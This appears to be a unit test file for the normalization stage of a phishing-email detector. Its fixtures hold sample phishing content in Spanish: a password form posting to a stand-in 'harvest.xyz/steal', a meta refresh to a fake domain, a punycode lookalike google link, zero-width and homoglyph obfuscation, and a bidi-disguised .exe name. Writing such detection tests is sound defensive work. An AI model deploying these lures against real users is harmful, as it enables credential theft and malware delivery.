"""Unit tests for Stage 3: Normalization & Deobfuscation."""

import base64

from phishing_detector.models import PipelineContext
from phishing_detector.stages.ingestion import MimeIngestionStage
from phishing_detector.stages.normalization import NormalizationStage, normalize_text


def test_normalize_text_decodes_rfc2047_entities_zw_and_homoglyphs():
    # Cyrillic 'е' (\u0435) inside 'urgente' + zero-width space inside 'cuenta'
    raw = "Acci&#243;n urg\u0435nte: su c\u200buen\u200bta fue bloqueada"
    res = normalize_text(raw)

    assert "Acción urgente: su cuenta fue bloqueada" == res.text
    assert res.zero_width_removed == 2
    assert len(res.homoglyph_words) == 1
    assert "urgente" in res.homoglyph_words[0]


def test_normalize_text_decodes_base64_and_quoted_printable():
    b64 = base64.b64encode(b"Verifique su cuenta de inmediato").decode("ascii")
    assert normalize_text(b64).text == "Verifique su cuenta de inmediato"

    qp = "Acci=C3=B3n requerida en su cuenta"
    assert normalize_text(qp).text == "Acción requerida en su cuenta"


def test_html_hidden_css_with_spaces_forms_meta_refresh_and_visible_text():
    html_body = """
    <html>
      <head>
        <meta http-equiv="refresh" content="0;url=https://evil-redirect.xyz/login">
      </head>
      <body>
        <p>Estimado usuario, se requiere acci&#243;n <b>urgente</b> ahora.</p>
        <p>Su c\u200buen\u200bta ha sido suspendida.</p>
        <div style="display: none; font-size: 0px">Texto oculto anti-filtro</div>
        <form action="https://harvest.xyz/steal" method="post">
          <input type="password" name="pw">
        </form>
        <a href="http://xn--googl-0qa.com/login">https://www.google.com/login</a>
      </body>
    </html>
    """
    msg = MimeIngestionStage().from_parts(
        "=?utf-8?q?Acci=C3=B3n_Requerida?=", html_body
    )
    ctx = PipelineContext(email=msg)
    NormalizationStage().execute(ctx)

    norm = ctx.normalized
    assert norm.clean_subject == "Acción Requerida"
    assert norm.has_hidden_css is True
    assert "Texto oculto anti-filtro" not in norm.clean_html_text
    assert "urgente" in norm.clean_html_text
    assert "ahora." in norm.clean_html_text
    assert "cuenta" in norm.clean_html_text
    assert norm.zero_width_chars_removed == 2
    assert len(norm.form_actions) == 1
    assert len(norm.meta_refresh_urls) == 1

    rule_ids = {f.rule_id for f in ctx.findings}
    assert {
        "HTML_HIDDEN_CSS_TEXT",
        "TEXT_ZERO_WIDTH_OBFUSCATION",
        "HTML_EXTERNAL_FORM",
        "HTML_META_REFRESH",
    }.issubset(rule_ids)


def test_bidi_override_triggers_critical_finding():
    msg = MimeIngestionStage().from_parts("Factura", "Abrir invoice_\u202efdp.exe")
    ctx = PipelineContext(email=msg)
    NormalizationStage().execute(ctx)

    assert ctx.normalized.bidi_controls_removed == 1
    assert any(f.rule_id == "TEXT_BIDI_OVERRIDE" for f in ctx.findings)
